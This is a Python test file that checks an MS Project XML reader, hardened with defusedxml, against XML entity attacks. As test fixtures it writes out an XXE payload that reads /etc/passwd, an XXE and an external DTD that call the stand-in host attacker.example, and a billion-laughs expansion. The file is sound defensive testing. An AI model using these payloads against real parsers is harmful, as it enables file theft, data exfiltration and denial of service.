# MIT License
# Copyright (c) 2026 Vitor Maia Rodovalho
"""XXE / billion-laughs / external-DTD rejection in the MS Project XML parser.

Wave 0 #6 of v4.0 Cycle 1 (ADR-0009) swapped ``xml.etree.ElementTree`` for
``defusedxml.ElementTree`` to close CWE-611 (External XML Entity) before
Cycle 1 Shallow #2 markets ".xml first-class support". This test battery
confirms the common entity-attack payloads are refused.

Public payload templates (not secrets) — mirror well-known OWASP examples.
"""

from __future__ import annotations

import pytest

from defusedxml.common import (
    DTDForbidden,
    EntitiesForbidden,
    ExternalReferenceForbidden,
)

from src.parser.msp_reader import MSPReader

MSP_NS = "http://schemas.microsoft.com/project"

# Classic file-exfiltration XXE. A vulnerable parser would read /etc/passwd
# and substitute the contents into <Name>.
_XXE_FILE_EXFIL = f"""<?xml version="1.0"?>
<!DOCTYPE project [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<Project xmlns="{MSP_NS}">
  <Name>&xxe;</Name>
</Project>
"""

# External-network XXE — vulnerable parser would call out to attacker.
_XXE_NETWORK_EXFIL = f"""<?xml version="1.0"?>
<!DOCTYPE project [
  <!ENTITY xxe SYSTEM "http://attacker.example/collect">
]>
<Project xmlns="{MSP_NS}">
  <Name>&xxe;</Name>
</Project>
"""

# Billion laughs (exponential entity expansion DoS).
_BILLION_LAUGHS = f"""<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<Project xmlns="{MSP_NS}">
  <Name>&lol4;</Name>
</Project>
"""

# Plain external DTD reference (no entity body) — should also be refused.
_EXTERNAL_DTD = f"""<?xml version="1.0"?>
<!DOCTYPE project SYSTEM "http://attacker.example/evil.dtd">
<Project xmlns="{MSP_NS}">
  <Name>demo</Name>
</Project>
"""


class TestMSPParserEntityHardening:
    def test_xxe_file_exfil_is_rejected(self) -> None:
        reader = MSPReader()
        with pytest.raises((EntitiesForbidden, ExternalReferenceForbidden, DTDForbidden)):
            reader.parse(_XXE_FILE_EXFIL)

    def test_xxe_network_exfil_is_rejected(self) -> None:
        reader = MSPReader()
        with pytest.raises((EntitiesForbidden, ExternalReferenceForbidden, DTDForbidden)):
            reader.parse(_XXE_NETWORK_EXFIL)

    def test_billion_laughs_is_rejected(self) -> None:
        reader = MSPReader()
        with pytest.raises((EntitiesForbidden, DTDForbidden)):
            reader.parse(_BILLION_LAUGHS)

    def test_external_dtd_is_rejected(self) -> None:
        reader = MSPReader()
        with pytest.raises((DTDForbidden, ExternalReferenceForbidden)):
            reader.parse(_EXTERNAL_DTD)

    def test_benign_msp_xml_still_parses(self) -> None:
        """The hardening must not break legitimate MSP XML — no DTD, no
        entities, standard namespace."""
        benign = f"""<?xml version="1.0" encoding="utf-8"?>
<Project xmlns="{MSP_NS}">
  <Name>Benign Project</Name>
  <Tasks>
    <Task>
      <UID>1</UID>
      <ID>1</ID>
      <Name>Task One</Name>
      <OutlineLevel>1</OutlineLevel>
    </Task>
  </Tasks>
</Project>
"""
        reader = MSPReader()
        schedule = reader.parse(benign)
        # At least the project name survives the round trip.
        assert schedule.projects, "benign MSP XML should yield at least one project"
        assert schedule.projects[0].proj_short_name == "Benign Project"


class TestMSPReaderImportsDefused:
    """Static guard: the parser module imports from defusedxml, not the
    stdlib xml.etree parser. Regression-proofing against a future refactor
    that 'cleans up' the import and silently reintroduces CWE-611."""

    def test_msp_reader_uses_defusedxml_for_parsing(self) -> None:
        from pathlib import Path

        source = Path("src/parser/msp_reader.py").read_text(encoding="utf-8")
        assert "from defusedxml.ElementTree import" in source, (
            "src/parser/msp_reader.py must parse MSP XML via defusedxml to "
            "block XXE / billion-laughs / external-DTD payloads (CWE-611). "
            "See ADR-0009 Wave 0 #6."
        )
        assert "ET.fromstring(" not in source, (
            "ET.fromstring (stdlib) must NOT be called for MSP XML parsing — "
            "use the imported _safe_fromstring (defusedxml) instead."
        )
